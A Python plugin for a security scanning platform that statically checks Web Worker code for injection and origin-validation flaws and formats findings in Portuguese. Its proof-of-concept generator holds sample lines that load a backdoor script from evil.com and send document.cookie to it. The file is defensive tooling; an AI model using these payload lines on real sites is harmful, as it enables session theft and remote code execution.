import json
import os
import re
import subprocess
import tempfile
from app.plugins.base import ScannerAdapter
from app.plugins.loader import register

STATIC_PATTERNS = {
    "dynamic_importScripts": {
        "pattern": r'importScripts\s*\(\s*([^)]+)\s*\)',
        "severity": "HIGH",
        "cwe": "CWE-94",
        "cvss": 7.5,
        "cvss_critical": 9.5,
        "title": "Dynamic importScripts without Validation",
        "description": "Worker accepts an arbitrary URL via postMessage and passes it directly to importScripts() with no whitelist validation.",
        "impact": "Arbitrary code execution within the worker thread, data exfiltration, integrity compromise.",
        "owasp": "A03:2021 – Injection",
        "poc_generated": True,
        "remediation": "Implement a URL allowlist. Only permit scripts from explicitly trusted CDN domains.",
        "check_dynamic": True
    },
    "eval_usage": {
        "pattern": r'\beval\s*\(',
        "severity": "HIGH",
        "cwe": "CWE-95",
        "cvss": 8.1,
        "cvss_critical": 10.0,
        "title": "eval or Function Constructor Usage",
        "description": "Worker code uses eval() — classic code injection primitive.",
        "impact": "Remote code execution.",
        "owasp": "A03:2021 – Injection",
        "poc_generated": True,
        "remediation": "Replace eval with JSON.parse() or structured data handling. Never interpret user input as code."
    },
    "function_constructor": {
        "pattern": r'new\s+Function\s*\(',
        "severity": "HIGH",
        "cwe": "CWE-95",
        "cvss": 8.1,
        "cvss_critical": 10.0,
        "title": "Function Constructor Usage",
        "description": "Worker code uses new Function() — classic code injection primitive.",
        "impact": "Remote code execution.",
        "owasp": "A03:2021 – Injection",
        "poc_generated": True,
        "remediation": "Replace new Function() with JSON.parse() or structured data handling."
    },
    "worker_creation": {
        "pattern": r'new\s+Worker\s*\(\s*([^)]+)\s*\)',
        "severity": "INFO",
        "cwe": "N/A",
        "cvss": 0.0,
        "title": "Worker Creation Detected",
        "description": "Code creates a new Web Worker.",
        "impact": "Informational — worker detection for auditing.",
        "owasp": "N/A",
        "poc_generated": False,
        "remediation": "N/A"
    },
    "postMessage_no_origin": {
        "pattern": r'self\.postMessage',
        "severity": "MEDIUM",
        "cwe": "CWE-346",
        "cvss": 5.3,
        "title": "postMessage without Origin Validation",
        "description": "Worker calls self.postMessage() but no event.origin or e.origin check is present in the message handler.",
        "impact": "Cross-origin data leakage; XSS escalation in the worker security context.",
        "owasp": "A01:2021 – Broken Access Control",
        "poc_generated": False,
        "remediation": "Validate event.origin in every onmessage handler before processing data.",
        "check_origin": True
    },
    "jsonparse_no_trycatch": {
        "pattern": r'JSON\.parse\s*\(',
        "severity": "LOW",
        "cwe": "CWE-755",
        "cvss": 3.7,
        "title": "JSON.parse without Error Handling",
        "description": "JSON.parse() called without a surrounding try/catch, making the worker susceptible to crash on malformed input.",
        "impact": "Denial of Service (worker thread crash).",
        "owasp": "A04:2021 – Insecure Design",
        "poc_generated": False,
        "remediation": "Wrap all JSON.parse() calls in try-catch.",
        "check_trycatch": True
    },
    "ssrf_dynamic_fetch": {
        "pattern": r'fetch\s*\([^)]*\+[^)]*\)',
        "severity": "MEDIUM",
        "cwe": "CWE-918",
        "cvss": 6.5,
        "title": "SSRF via Dynamic fetch URL",
        "description": "Worker constructs fetch() URLs using string concatenation, allowing an attacker to influence the destination.",
        "impact": "Server-Side Request Forgery (SSRF), internal network scanning.",
        "owasp": "A10:2021 – Server-Side Request Forgery",
        "poc_generated": False,
        "remediation": "Validate and sanitize all URLs before issuing fetch requests. Use an allowlist of permitted origins."
    }
}

HEURISTICS_EMBEDDED_WORKER = [
    r'(importScripts|onmessage|postMessage|close\s*\()',
    r'(self\s*\.\s*)(addEventListener|onmessage|postMessage|close)',
    r'(function\s+\w+\s*\(.*\b(event|data)\b)',
]


def _has_origin_check(source: str) -> bool:
    return bool(re.search(r'(e|event)\.origin\s*===?\s*[\'"]', source) or
                re.search(r'e\.origin\s*!==?\s*[\'"]', source) or
                re.search(r'event\.origin\s*===?\s*[\'"]', source))


def _has_trycatch(source: str) -> bool:
    open_blocks = [m.start() for m in re.finditer(r'try\s*\{', source)]
    close_blocks = [m.start() for m in re.finditer(r'\}\s*catch\s*\(', source)]
    return len(open_blocks) > 0


def _has_validation_guard(source: str) -> bool:
    guards = [r'\b(?:includes|startsWith|match|indexOf)\s*\(', r'===', r'!==',
              r'allowlist', r'whitelist', r'trusted', r'validate']
    return any(re.search(g, source, re.IGNORECASE) for g in guards)


def _is_dynamic_param(match: str, source: str) -> bool:
    full_match = match.group(0)
    params = match.group(1) if match.lastindex else ""
    return bool(re.search(r'[\w.]+', params)) and not re.search(r'[\'"]https?://', params)


def _generate_poc(poc_type: str) -> str:
    pocs = {
        "importScripts": (
            "// PoC: Message with malicious URL triggers importScripts\n"
            "worker.postMessage('https://evil.com/backdoor.js');\n"
            "// Expected: Worker fetches and executes evil.com/backdoor.js"
        ),
        "eval": (
            "// PoC: Inject code via postMessage that reaches eval()\n"
            "worker.postMessage({cmd: 'fetch(\"https://evil.com/exfil?d=\"+document.cookie)'});"
        ),
        "function_constructor": (
            "// PoC: new Function() allows arbitrary code execution\n"
            "worker.postMessage({code: 'return fetch(\"https://evil.com/leak\")'});"
        )
    }
    return pocs.get(poc_type, "")


def _run_static_analysis(source: str, source_name: str = "inline") -> dict:
    findings = []
    for key, cfg in STATIC_PATTERNS.items():
        matches = list(re.finditer(cfg["pattern"], source))
        if not matches:
            continue
        if key == "worker_creation":
            findings.append({
                "title": cfg["title"],
                "severity": "INFO",
                "cvss": 0.0,
                "cwe": "N/A",
                "owasp": "N/A",
                "impact": cfg["impact"],
                "line": source.count("\n", 0, matches[0].start()) + 1 if matches else 0,
                "source_file": source_name,
                "exploitable": False,
                "poc": ""
            })
            continue
        severity = cfg["severity"]
        cvss = cfg["cvss"]
        exploitable = True
        poc = ""
        if key == "dynamic_importScripts":
            has_dynamic = any(_is_dynamic_param(m, source) for m in matches)
            has_guard = _has_validation_guard(source)
            if has_dynamic and not has_guard:
                severity = "CRITICAL"
                cvss = cfg["cvss_critical"]
            elif not has_dynamic:
                continue
            poc = _generate_poc("importScripts")
        elif key == "eval_usage":
            severity = "CRITICAL"
            cvss = cfg["cvss_critical"]
            poc = _generate_poc("eval")
        elif key == "function_constructor":
            severity = "CRITICAL"
            cvss = cfg["cvss_critical"]
            poc = _generate_poc("function_constructor")
        elif key == "postMessage_no_origin":
            if cfg.get("check_origin") and _has_origin_check(source):
                continue
        elif key == "jsonparse_no_trycatch":
            if cfg.get("check_trycatch") and _has_trycatch(source):
                continue
        line = source.count("\n", 0, matches[0].start()) + 1
        findings.append({
            "title": cfg["title"],
            "severity": severity,
            "cvss": cvss,
            "cwe": cfg["cwe"],
            "owasp": cfg["owasp"],
            "impact": cfg["impact"],
            "line": line,
            "source_file": source_name,
            "exploitable": exploitable,
            "poc": poc,
            "remediation": cfg["remediation"]
        })
    return findings


def _detect_embedded_worker(source: str) -> bool:
    scores = []
    for h in HEURISTICS_EMBEDDED_WORKER:
        matches = re.findall(h, source)
        scores.append(len(matches))
    return any(s > 0 for s in scores)


def _classify_by_severity(findings: list) -> dict:
    classified = {"critical": [], "active": [], "latent": []}
    for f in findings:
        sev = f.get("severity", "INFO").upper()
        if sev in ("CRITICAL", "CRITICA"):
            classified["critical"].append(f)
        elif sev in ("HIGH", "ALTA", "MEDIUM", "MEDIA", "LOW", "BAIXA"):
            classified["active"].append(f)
        else:
            classified["latent"].append(f)
    return classified


@register()
class BadWorkerAdapter(ScannerAdapter):
    @property
    def name(self) -> str:
        return "BadWorker"

    def validate_input(self, raw_data: str) -> bool:
        try:
            data = json.loads(raw_data)
            return "vulnerabilities" in data or "workers" in data or "security_score" in data
        except Exception:
            return False

    def normalize(self, raw_data: str, project_id: int) -> list:
        data = json.loads(raw_data)
        findings = []
        base = {"project_id": project_id, "plugin_source": self.name}

        scan_meta = data.get("scan_metadata", {})
        target = scan_meta.get("target", "unknown")

        for vuln in data.get("vulnerabilities", {}).get("critical", []):
            findings.append(self._vuln_to_finding(vuln, "Crítica", base))

        for vuln in data.get("vulnerabilities", {}).get("active", []):
            sev_map = {"HIGH": "Alta", "MEDIUM": "Média", "LOW": "Baixa"}
            sev = sev_map.get(vuln.get("severity", "").upper(), "Média")
            findings.append(self._vuln_to_finding(vuln, sev, base))

        for vuln in data.get("vulnerabilities", {}).get("latent", []):
            findings.append({**base,
                "title": f"[Latent] {vuln.get('title', 'Issue')}",
                "description": (
                    f"Status: LATENT (code present, not yet active)\n"
                    f"File: {vuln.get('source_file', 'N/A')}:{vuln.get('line', 'N/A')}\n"
                    f"Pattern: {vuln.get('pattern', 'N/A')}\n"
                    f"Impact: {vuln.get('impact', 'N/A')}\n"
                    f"CWE: {vuln.get('cwe', 'N/A')}"
                ),
                "severity": "Média",
                "raw_data": vuln})

        for w in data.get("workers", {}).get("active", []):
            findings.append({**base,
                "title": "Web Worker Detected (Active)",
                "description": (
                    f"URL: {w.get('url', 'N/A')}\n"
                    f"Type: {w.get('type', 'web-worker')}\n"
                    f"Is Blob: {w.get('isBlob', False)}\n"
                    f"Timestamp: {w.get('timestamp', 'N/A')}"
                ),
                "severity": "Info",
                "raw_data": w})

        static_vulns = data.get("vulnerabilities", {}).get("static_analysis", [])
        for v in static_vulns:
            sev = v.get("severity", "INFO").upper()
            mapped = "Crítica" if sev in ("CRITICAL", "CRITICA") else ("Alta" if sev == "HIGH" else "Média" if sev in ("MEDIUM", "MEDIA") else "Info")
            findings.append(self._vuln_to_finding(v, mapped, base))

        security_score = data.get("security_score", 0)
        risk_level = data.get("risk_level", "UNKNOWN")
        findings.append({**base,
            "title": f"BadWorker Scan Summary: {target}",
            "description": (
                f"Security Score: {security_score}/100\n"
                f"Risk Level: {risk_level}\n"
                f"Active Workers: {len(data.get('workers', {}).get('active', []))}\n"
                f"Critical Vulns: {len(data.get('vulnerabilities', {}).get('critical', []))}\n"
                f"Active Vulns: {len(data.get('vulnerabilities', {}).get('active', []))}\n"
                f"Latent Threats: {len(data.get('vulnerabilities', {}).get('latent', []))}\n"
                f"Static Analysis: {len(static_vulns)}"
            ),
            "severity": "Info",
            "raw_data": {"security_score": security_score, "risk_level": risk_level}})

        return findings

    def _vuln_to_finding(self, vuln: dict, severity: str, base: dict) -> dict:
        desc = (
            f"Severity: {vuln.get('severity', 'N/A')}\n"
            f"CVSS: {vuln.get('cvss', 'N/A')}\n"
            f"File: {vuln.get('source_file', 'N/A')}:{vuln.get('line', 'N/A')}\n"
            f"Impact: {vuln.get('impact', 'N/A')}\n"
            f"CWE: {vuln.get('cwe', 'N/A')}\n"
            f"OWASP: {vuln.get('owasp', 'N/A')}\n"
            f"Exploitable: {vuln.get('exploitable', False)}"
        )
        poc = vuln.get("poc", "")
        if poc:
            desc += f"\n\nPoC:\n{poc}"
        remediation = vuln.get("remediation", "")
        if remediation:
            desc += f"\n\nRemediação:\n{remediation}"
        return {**base,
            "title": vuln.get("title", "Security Issue"),
            "description": desc,
            "severity": severity,
            "raw_data": vuln}

    def run_scan(self, target_url: str) -> str:
        tool_dir = os.path.join(os.getcwd(), '.tools', 'bad-worker')
        with tempfile.TemporaryDirectory() as tmpdir:
            cmd = [
                "node", "bad-worker.js", target_url,
                "--output", tmpdir, "--no-headless", "--no-static", "-v"
            ]
            result = subprocess.run(cmd, cwd=tool_dir, capture_output=True, text=True, timeout=120000)
            report_path = os.path.join(tmpdir, "report.json")
            if os.path.exists(report_path):
                with open(report_path) as f:
                    return f.read()
            detailed_path = os.path.join(tmpdir, "detailed.json")
            if os.path.exists(detailed_path):
                with open(detailed_path) as f:
                    return f.read()
            return result.stdout

    def run_static_analysis(self, source: str, source_name: str = "inline") -> str:
        findings = _run_static_analysis(source, source_name)
        classified = _classify_by_severity(findings)
        is_embedded = _detect_embedded_worker(source)
        score = max(0, 100 - len(findings) * 10)
        risk = "HIGH" if len(classified["critical"]) > 0 else "MEDIUM" if len(classified["active"]) > 1 else "LOW"
        result = {
            "tool": "BadWorker",
            "scan_metadata": {"target": source_name, "mode": "static"},
            "vulnerabilities": {**classified, "static_analysis": findings},
            "workers": {"active": [], "latent": []},
            "embedded_worker_detected": is_embedded,
            "security_score": score,
            "risk_level": risk
        }
        return json.dumps(result, indent=2)
